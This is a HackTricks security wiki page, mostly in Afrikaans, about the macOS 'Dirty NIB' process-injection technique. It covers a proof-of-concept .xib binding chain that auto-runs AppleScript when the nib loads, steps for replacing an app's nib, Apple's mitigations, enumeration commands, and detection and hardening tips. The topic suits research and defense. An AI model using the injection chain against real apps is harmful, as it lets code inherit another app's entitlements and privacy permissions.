# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB verwys na die misbruik van Interface Builder-lêers (.xib/.nib) binne 'n getekende macOS-app-bundel om aanvaller-beheerde logika binne die teikenproses uit te voer, en sodoende die teikenproses se entitlements en TCC-permissies te erf. Hierdie tegniek is oorspronklik deur xpn (MDSec) gedokumenteer en later deur Sector7 veralgemeen en aansienlik uitgebrei. Sector7 het ook Apple se mitigations in macOS 13 Ventura en macOS 14 Sonoma behandel.<sup>[[1]](#references)[[2]](#references)</sup> Sien die verwysings aan die einde vir agtergrond en diepgaande ontledings.

> TL;DR
> • Voor macOS 13 Ventura: Die vervanging van 'n bundel se MainMenu.nib (of 'n ander nib wat by startup gelaai word) kon betroubaar process injection en dikwels privilege escalation bewerkstellig.
> • Sedert macOS 13 (Ventura), en verbeter in macOS 14 (Sonoma): first-launch deep verification, bundle protection, Launch Constraints en die nuwe TCC-“App Management”-permission voorkom grootliks nib-tampering ná launch deur onverwante apps. Aanvalle kan steeds in nisgevalle moontlik wees (bv. tooling van dieselfde developer wat sy eie apps wysig, of terminals waaraan die gebruiker App Management/Full Disk Access toegestaan het).

## Wat is NIB/XIB-lêers

Nib-lêers (kort vir NeXT Interface Builder) is geserialiseerde UI-objectgrafieke wat deur AppKit-apps gebruik word. Moderne Xcode stoor redigeerbare XML .xib-lêers, wat tydens build in .nib-lêers gekompileer word. 'n Tipiese app laai sy hoof-UI via `NSApplicationMain()`, wat die `NSMainNibFile`-sleutel uit die app se Info.plist lees en die object graph tydens runtime instantieer.

Sleutelpunte wat die aanval moontlik maak:
- NIB-loading instansieer arbitrêre Objective-C-klasse sonder dat hulle aan NSSecureCoding hoef te voldoen (Apple se nib loader val terug na `init`/`initWithFrame:` wanneer `initWithCoder:` nie beskikbaar is nie).
- Cocoa Bindings kan misbruik word om metodes aan te roep terwyl nibs geïnstantieer word, insluitend chained calls wat geen user interaction vereis nie.


## Dirty NIB injection process (attacker view)

Die klassieke pre-Ventura-vloei:
1) Create a malicious .xib
- Voeg 'n `NSAppleScript`-objek (of ander “gadget”-klasse soos `NSTask`) by.
- Voeg 'n `NSTextField` by waarvan die titel die payload bevat (bv. AppleScript of command arguments).
- Voeg een of meer `NSMenuItem`-objekte by wat via bindings gekoppel is om metodes op die teikenobjek aan te roep.

2) Auto-trigger without user clicks
- Gebruik bindings om 'n menu item se target/selector te stel en roep dan die private `_corePerformAction`-metode aan sodat die aksie outomaties uitgevoer word wanneer die nib gelaai word. Dit verwyder die behoefte dat 'n gebruiker op 'n knoppie klik.

Minimale voorbeeld van 'n auto-trigger chain binne 'n .xib (verkort vir duidelikheid):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
Dit bewerkstellig arbitrêre AppleScript-uitvoering in die teikenproses wanneer nib gelaai word.<sup>[[1]](#references)</sup> Gevorderde kettings kan:
- Arbitrêre AppKit-klasse (byvoorbeeld `NSTask`) instansieer en metodes sonder argumente soos `-launch` aanroep.
- Arbitrêre selectors met objek-argumente via die binding-truuk hierbo aanroep.
- AppleScriptObjC.framework laai om na Objective-C te bridge en selfs geselekteerde C APIs aan te roep.
- Op ouer stelsels wat steeds Python.framework insluit, na Python bridge en dan `ctypes` gebruik om arbitrêre C-funksies aan te roep (Sector7 se navorsing).<sup>[[2]](#references)</sup>

3) Vervang die app se nib
- Kopieer target.app na ’n skryfbare ligging, vervang byvoorbeeld `Contents/Resources/MainMenu.nib` met die malicious nib, en voer target.app uit. Voor Ventura het daaropvolgende launches, ná ’n eenmalige Gatekeeper-assessment, slegs vlak handtekeningkontroles uitgevoer; nie-uitvoerbare resources (soos .nib) is dus nie weer gevalideer nie.

Voorbeeld van ’n AppleScript-payload vir ’n sigbare toets:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Moderne macOS-beskermingsmaatreëls (Ventura/Monterey/Sonoma/Sequoia)

Apple het verskeie sistemiese mitigations bekendgestel wat die lewensvatbaarheid van Dirty NIB in moderne macOS dramaties verminder:<sup>[[2]](#references)</sup>
- First-launch deep verification en bundle protection (macOS 13 Ventura)
- Met die eerste uitvoering van enige app (met of sonder quarantine) dek ’n diep signature check alle bundle resources. Daarna word die bundle beskerm: slegs apps van dieselfde developer (of apps wat uitdruklik deur die app toegelaat word) mag die inhoud daarvan wysig. Ander apps benodig die nuwe TCC-“App Management”-permission om na ’n ander app se bundle te skryf.
- Launch Constraints (macOS 13 Ventura)
- System-/Apple-bundled apps kan nie eldersheen gekopieer en uitgevoer word nie; dit beëindig die “copy to /tmp, patch, run”-benadering vir OS-apps.
- Verbeterings in macOS 14 Sonoma
- Apple het App Management versterk en bekende bypasses reggestel (bv. CVE-2023-40450) wat deur Sector7 aangeteken is. Python.framework is vroeër verwyder (macOS 12.3), wat sommige privilege-escalation chains verbreek het.
- Gatekeeper/Quarantine-wysigings
- Vir ’n breër bespreking van Gatekeeper, provenance en assessment-wysigings wat hierdie tegniek beïnvloed het, sien die bladsy waarna hieronder verwys word.

> Praktiese implikasie
> • Op Ventura+ kan jy oor die algemeen nie ’n third-party app se .nib wysig nie, tensy jou proses App Management het of deur dieselfde Team ID as die target gesign is (bv. developer tooling).
> • Om App Management of Full Disk Access aan shells/terminals toe te ken, heropen effektief hierdie attack surface vir enigiets wat code binne daardie terminal se context kan uitvoer.


### Aanspreek van Launch Constraints

Launch Constraints blokkeer die uitvoering van baie Apple-apps vanaf nie-default-liggings, vanaf Ventura. As jy op pre-Ventura-workflows staatgemaak het, soos om ’n Apple-app na ’n temporary directory te kopieer, `MainMenu.nib` te wysig en dit uit te voer, verwag dat dit op >= 13.0 sal misluk.


## Enumerating van targets en nibs (nuttig vir navorsing / legacy systems)

- Vind apps waarvan die UI deur nib aangedryf word:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Vind kandidaat-nib-hulpbronne binne ’n bundle:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Valideer code signatures deeglik (sal misluk indien jy met resources gepeuter het en dit nie weer onderteken het nie):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Nota: Op moderne macOS sal jy ook deur bundle protection/TCC geblokkeer word wanneer jy sonder behoorlike magtiging na ’n ander toepassing se bundle probeer skryf.


## Detection en DFIR-wenke

- File integrity monitoring op bundle-resources
- Let op mtime/ctime-veranderinge aan `Contents/Resources/*.nib` en ander nie-uitvoerbare resources in geïnstalleerde toepassings.
- Unified logs en prosesgedrag
- Monitor vir onverwagte AppleScript-execution binne GUI-toepassings en vir prosesse wat AppleScriptObjC of Python.framework laai. Voorbeeld:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Proaktiewe assesserings
- Voer periodiek `codesign --verify --deep` oor kritieke toepassings uit om te verseker dat resources ongeskonde bly.
- Privilege-konteks
- Oudit wie/wat TCC-“App Management” of Full Disk Access het, veral terminals en management-agents. Deur dit van algemene-purpose shells te verwyder, voorkom jy dat Dirty NIB-styl tampering maklik heraktiveer word.


## Defensive hardening (developers en defenders)

- Verkies programmatic UI of beperk wat vanaf nibs geïnstantieer word. Vermy die insluiting van kragtige classes (bv. `NSTask`) in nib-grafieke en vermy bindings wat selectors indirek op arbitrêre objects oproep.
- Gebruik die hardened runtime met Library Validation (reeds standaard vir moderne toepassings). Hoewel dit nie nib injection op sy eie keer nie, blokkeer dit maklike native code loading en dwing dit attackers na scripting-only payloads.
- Moenie breë App Management-permissions in algemene-purpose tools aanvra of daarvan afhanklik wees nie. As MDM App Management vereis, skei daardie konteks van user-driven shells.
- Verifieer gereeld jou app bundle se integrity en maak jou update mechanisms self-healing vir bundle-resources.


## Verwante leesstof in HackTricks

Kom meer te wete oor Gatekeeper, quarantine en provenance changes wat hierdie technique beïnvloed:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## References

- [1] [xpn – DirtyNIB (original write-up with Pages example)](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (April 5, 2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
